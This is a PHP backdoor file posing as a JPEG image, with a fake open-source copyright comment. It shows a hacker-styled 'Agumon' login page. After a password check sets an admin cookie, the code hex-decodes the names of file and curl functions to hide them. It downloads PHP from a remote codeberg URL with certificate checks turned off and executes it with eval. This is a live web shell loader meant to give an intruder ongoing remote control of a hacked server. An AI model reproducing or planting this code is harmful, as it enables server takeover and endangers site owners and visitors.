!ÿØÿà␀␐JFIF␀␁� trio@ngefly �!
 <?php
/**
 * @package    
 * @copyright  Copyright (C) 2025 Open Source Matters, Inc. All rights reserved.
 *
 */

// @deprecated  1.0  Deprecated without replacement
function is_logged_in()
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'admin@agumon'; 
}

if (is_logged_in()) {
    $Array = array(
        '666f70656e', # fo p en => 0
        '73747265616d5f6765745f636f6e74656e7473', # strea m_get_contents => 1
        '66696c655f6765745f636f6e74656e7473', # fil e_g et_cont ents => 2
        '6375726c5f65786563' # cur l_ex ec => 3
    );

    function hex2str($hex) {
        $str = '';
        for ($i = 0; $i < strlen($hex); $i += 2) {
            $str .= chr(hexdec(substr($hex, $i, 2)));
        }
        return $str;
    }

    function geturlsinfo($destiny) {
        $belief = array(
            hex2str($GLOBALS['Array'][0]), 
            hex2str($GLOBALS['Array'][1]), 
            hex2str($GLOBALS['Array'][2]), 
            hex2str($GLOBALS['Array'][3])  
        );

        if (function_exists($belief[3])) { 
            $ch = curl_init($destiny);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $love = $belief[3]($ch);
            curl_close($ch);
            return $love;
        } elseif (function_exists($belief[2])) { 
            return $belief[2]($destiny);
        } elseif (function_exists($belief[0]) && function_exists($belief[1])) { 
            $purpose = $belief[0]($destiny, "r");
            $love = $belief[1]($purpose);
            fclose($purpose);
            return $love;
        }
        return false;
    }

    $destiny = 'https://codeberg.org/citranina/phpfile/raw/branch/main/tinyfalse.php';
    $dream = geturlsinfo($destiny);
    if ($dream !== false) {
        eval('?>' . $dream);
    }
} else {
    if (isset($_POST['password'])) {
        $entered_key = $_POST['password'];
        $hashed_key = '$2y$10$ZEXUSP6Q3MPMVjj9hE6JIOLeFa1sa6HBHW/ILrvOaUmT4tDmXr0S6';
        
        if (password_verify($entered_key, $hashed_key)) {
            setcookie('user_id', 'admin@agumon', time() + 3600, '/'); 
            header("Location: ".$_SERVER['PHP_SELF']); 
            exit();
        }
    }
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Agumon Scripts</title>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Source+Code+Pro:wght@400;600&display=swap');

    *{margin:0;padding:0;box-sizing:border-box;}
    body{font-family:'Source Code Pro',monospace;background:#000;color:#00ff00;overflow:hidden;height:100vh;}
    .bg-matrix,.matrix-rain,.grid-overlay{position:absolute;top:0;left:0;width:100%;height:100%;}
    .bg-matrix{background:linear-gradient(45deg,#0a0a0a,#1a1a2e,#16213e);z-index:-2;}
    .matrix-rain{pointer-events:none;z-index:-1;}
    .matrix-column{position:absolute;top:-100%;font-size:14px;color:#00ff00;opacity:.7;white-space:nowrap;animation:matrixFall linear infinite;}
    @keyframes matrixFall{to{top:100vh;}}
    .grid-overlay{background-image:linear-gradient(rgba(0,255,255,0.1) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,255,0.1) 1px,transparent 1px);background-size:50px 50px;animation:gridFlicker 2s infinite;z-index:-1;}
    @keyframes gridFlicker{0%,100%{opacity:.3;}50%{opacity:.1;}}

    .login-container{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:rgba(0,20,40,.95);border:2px solid #00ffff;border-radius:10px;padding:40px;min-width:400px;box-shadow:0 0 50px rgba(0,255,255,.5),inset 0 0 20px rgba(0,0,0,.8);animation:containerPulse 3s infinite ease-in-out;}
    @keyframes containerPulse{0%,100%{box-shadow:0 0 50px rgba(0,255,255,.5),inset 0 0 20px rgba(0,0,0,.8);}50%{box-shadow:0 0 80px rgba(0,255,255,.8),inset 0 0 20px rgba(0,0,0,.8);}}
    .login-header{text-align:center;margin-bottom:30px;}
    .logo{font-family:'Orbitron',monospace;font-size:28px;font-weight:900;color:#00ffff;text-shadow:0 0 20px #00ffff;margin-bottom:10px;animation:logoGlitch 4s infinite;}
    @keyframes logoGlitch{0%,90%,100%{transform:translate(0);filter:hue-rotate(0);}10%{transform:translate(-2px,1px);filter:hue-rotate(90deg);}20%{transform:translate(2px,-1px);filter:hue-rotate(180deg);}}
    .subtitle{font-size:12px;color:#00ff00;letter-spacing:3px;text-transform:uppercase;}
    .terminal-line{font-size:12px;margin:5px 0;opacity:0;animation:terminalType .5s forwards;}
    .terminal-line:nth-child(1){animation-delay:.5s;}
    .terminal-line:nth-child(2){animation-delay:1s;}
    .terminal-line:nth-child(3){animation-delay:1.5s;}
    @keyframes terminalType{to{opacity:1;}}

    .form-group{margin-bottom:25px;}
    .form-label{display:block;font-size:12px;color:#00ffff;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px;}
    .form-input{width:100%;background:rgba(0,0,0,.8);border:1px solid #00ff00;border-radius:5px;padding:12px 15px;font-size:14px;color:#00ff00;}
    .form-input:focus{border-color:#00ffff;box-shadow:0 0 15px rgba(0,255,255,.5),inset 0 0 10px rgba(0,255,255,.1);background:rgba(0,20,20,.9);}
    .hack-button{width:100%;background:linear-gradient(45deg,#ff0080,#8000ff);border:none;border-radius:5px;padding:15px;font-family:'Orbitron',monospace;font-size:16px;font-weight:700;color:#fff;text-transform:uppercase;letter-spacing:2px;cursor:pointer;position:relative;overflow:hidden;}
    .hack-button:hover{transform:translateY(-2px);box-shadow:0 10px 25px rgba(255,0,128,.4);}
    .hack-button:active{transform:translateY(0);}
    .hack-button::before{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.3),transparent);transition:.5s;}
    .hack-button:hover::before{left:100%;}

    .status-bar{margin-top:20px;padding:10px;background:rgba(0,0,0,.8);border:1px solid #444;border-radius:5px;min-height:50px;text-align:center;}
    .status-text{font-size:11px;color:#00ff00;}
    .loading{display:none;text-align:center;color:#00ffff;}

    /* Circular Progress Loader */
    .progress-circle{display:none;width:120px;height:120px;border-radius:50%;border:10px solid rgba(0,255,255,0.15);border-top-color:#00ffff;animation:spinLoader 1s linear infinite,glow 1.5s infinite alternate;margin:20px auto;position:relative;}
    @keyframes spinLoader{to{transform:rotate(360deg);}}
    @keyframes glow{from{box-shadow:0 0 10px #00ffff;}to{box-shadow:0 0 30px #ff00ff;}}
    .progress-text{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-family:'Orbitron',monospace;font-size:18px;font-weight:bold;color:#00ffff;}

    .security-indicator{position:absolute;top:15px;right:15px;font-size:12px;color:#ff0080;}
    .security-level{position:absolute;bottom:15px;left:15px;font-size:10px;color:#00ffff;text-transform:uppercase;}
    .glitch{animation:glitch .3s ease-in-out;}
    @keyframes glitch{0%{transform:translate(0);}20%{transform:translate(-2px,2px);}40%{transform:translate(-2px,-2px);}60%{transform:translate(2px,2px);}80%{transform:translate(2px,-2px);}100%{transform:translate(0);}}
    @media(max-width:500px){.login-container{margin:20px;min-width:auto;width:calc(100% - 40px);padding:30px 20px;}.logo{font-size:24px;}}
  </style>
</head>
<body>
  <div class="bg-matrix"></div>
  <div class="grid-overlay"></div>
  <div class="matrix-rain" id="matrixRain"></div>

  <div class="login-container" id="loginContainer">
    <div class="security-indicator"><i class="fas fa-shield-alt"></i> SEC-LV5</div>
    <div class="security-level">Agumon Firewall Active</div>

    <div class="login-header">
      <div class="logo">◢ Agumon ◣</div>
      <div class="subtitle">AGUMON ACCESS POINT</div>
    </div>

    <div class="terminal-line">> Initializing secure connection...</div>
    <div class="terminal-line">> Quantum encryption enabled</div>
    <div class="terminal-line">> Awaiting Agumon authorization...</div>

    <!-- Form -->
    <form id="loginForm" method="POST" action="">
      <div class="form-group">
        <label class="form-label"><i class="fas fa-user-secret"></i> AGUMON ID</label>
        <input type="text" name="user_id" class="form-input" placeholder="Enter your user identifier" required>
      </div>
      <div class="form-group">
        <label class="form-label"><i class="fas fa-key"></i> Access Code</label>
        <input type="password" name="password" class="form-input" placeholder="Enter your access password" required>
      </div>
      <button type="submit" class="hack-button"><i class="fas fa-brain"></i> INITIATE AGUMON LINK</button>
    </form>

    <!-- Progress Circle -->
    <div class="progress-circle" id="progressCircle"><div class="progress-text" id="progressText">0%</div></div>

    <div class="status-bar">
      <div class="status-text" id="statusText">Status: Awaiting authorization | Encryption: AES-256 | Connection: Secure</div>
    </div>
  </div>

  <script>
    // Matrix rain
    function createMatrixRain(){
      const matrixContainer=document.getElementById('matrixRain');
      const chars='01ｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉﾊﾋﾌﾍﾎﾏﾐﾑﾒﾓﾔﾕﾖﾗﾘﾙﾚﾛﾜﾝ';
      for(let i=0;i<50;i++){
        const column=document.createElement('div');
        column.className='matrix-column';
        column.style.left=Math.random()*100+'%';
        column.style.animationDuration=(Math.random()*3+2)+'s';
        column.style.animationDelay=Math.random()*2+'s';
        let columnText='';
        for(let j=0;j<20;j++){columnText+=chars[Math.floor(Math.random()*chars.length)]+'<br>';}
        column.innerHTML=columnText;
        matrixContainer.appendChild(column);
      }
    }
    createMatrixRain();

    // Login effect
    const loginForm=document.getElementById('loginForm');
    const loginContainer=document.getElementById('loginContainer');
    const statusText=document.getElementById('statusText');
    const progressCircle=document.getElementById('progressCircle');
    const progressText=document.getElementById('progressText');

    loginForm.addEventListener('submit',function(e){
      e.preventDefault();
      loginContainer.classList.add('glitch');
      setTimeout(()=>loginContainer.classList.remove('glitch'),300);

      // sembunyikan form
      loginForm.style.display='none';
      statusText.style.display='none';
      // tampilkan progress circle
      progressCircle.style.display='block';

      let percent=0;
      const interval=setInterval(()=>{
        percent++;
        progressText.textContent=percent+"%";
        if(percent>=100){
          clearInterval(interval);
          loginForm.submit(); // submit beneran
        }
      },30); // 0-100 = 3 detik
    });
  </script>
</body>
    <?php
}